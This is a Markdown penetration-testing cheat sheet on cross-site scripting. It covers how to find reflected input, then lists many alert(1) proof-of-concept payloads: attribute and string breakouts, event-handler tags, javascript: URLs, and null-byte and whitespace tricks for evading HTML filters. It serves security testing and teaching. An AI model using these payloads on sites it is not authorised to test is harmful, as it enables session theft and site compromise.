# XSS Manual

## Identifying Reflections of User Input

1.  `myxsstestdmqlwp` **Submit this string** as every parameter to every page, targeting only one parameter at a time. Only alphabetical characters.

2.  **Monitor the application's responses** for any appearance of this same string.

3.  **Test both GET and POST** requests. Both the URL query string and the message body.

4.  **Test HTTP request headers.** A common XSS vulnerability arises in error messages, where items such as the _Referer_ and _User-Agent_ headers are copied into the message's contents.

5.  **URL-encode** any special characters, including & = + ; and _space_

## Testing Reflections to Introduce Script

**Example 1: A Tag Attribute Value**
Suppose that the returned page contains the following:
`<input type="text" name="address1" value="myxsstestdmqlwp">`

Try:
`"><script>alert(1)</script>`
`" onfocus="alert(1)`

**Example 2: A JavaScript String**
If: `<script>var a = 'myxsstestdmqlwp'; var b = 123; ... </script>`
Try:
`'; alert(1); var foo='`
`'; alert(1); //`

**Example 3: An Attribute Containing a URL**
If `<a href="myxsstestdmqlwp">Click here ...</a>`
use the `javascript:` protocol to introduce script directly within the URL attribute.
Try:
`javascript:alert(1);`
`#"onclick="javascript:alert(1)`

## Event Handlers

```
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<xml onreadystatechange=alert(1)>
<style onreadystatechange=alert(1)>
<iframe onreadystatechange=alert(1)>
<object onerror=alert(1)>
<object type=image src=valid.gif onreadystatechange=alert(1)></object>
<img type=image src=valid.gif onreadystatechange=alert(1)
<input type=image src=valid.gif onreadystatechange=alert(1)
<isindex type=image src=valid.gif onreadystatechange=alert(1)
<script onreadystatechange=alert(1)
<bgsound onpropertychange=alert(1)
<body onbeforeactivate=alert(1)
<body onactivate=alert(1)
<body onfocusin=alert(1)>
```

Use `autofocus` attribute to automatically trigger events that previously required user interaction:

```
<input autofocus onfocus=alert(1)>
<input onblur=alert(1) autofocus><input autofocus>
<body onscroll=alert(1)><br><br>...<br><input autofocus>
```

Event handlers in closing tags:
`</a onmousemove=alert(1)>`

## Script Pseudo-Protocols

```
<object data=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<form id=test /><button form=test formaction=javascript:alert(1)>
<event-source src=javascript:alert(1)>
```

## Bypassing Filters: HTML

Ways in which HTML syntax can be obfuscated to defeat common filters.

`<img onerror=alert(1) src=a>`

**The Tag Name**
`<iMg onerror=alert(1) src=a>`

`<[%00]img onerror=alert(1) src=a>`
`<i[%00]mg onerror=alert(1) src=a>`
In these examples, [%XX] indicates the literal character with the hexadecimal ASCII code of XX. When submitting your attack to the application, generally you would use the URL-encoded form of the character. When reviewing the applica-tion's response, you need to look for the literal decoded character being reflected.

**Space Following the Tag Name**

```
<img/onerror=alert(1) src=a>
<img[%09]onerror=alert(1) src=a>
<img[%0d]onerror=alert(1) src=a>
<img[%0a]onerror=alert(1) src=a>
<img/"onerror=alert(1) src=a>
<img/'onerror=alert(1) src=a>
<img/anyjunk/onerror=alert(1) src=a>
<script/anyjunk>alert(1)</script>
```

**Attribute Names**
`<img o[%00]nerror=alert(1) src=a>`

**Attribute Delimiters**

```
<img onerror=”alert(1)”src=a>
<img onerror=’alert(1)’src=a>
<img onerror=`alert(1)`src=a>
<img/onerror=”alert(1)”src=a>

```
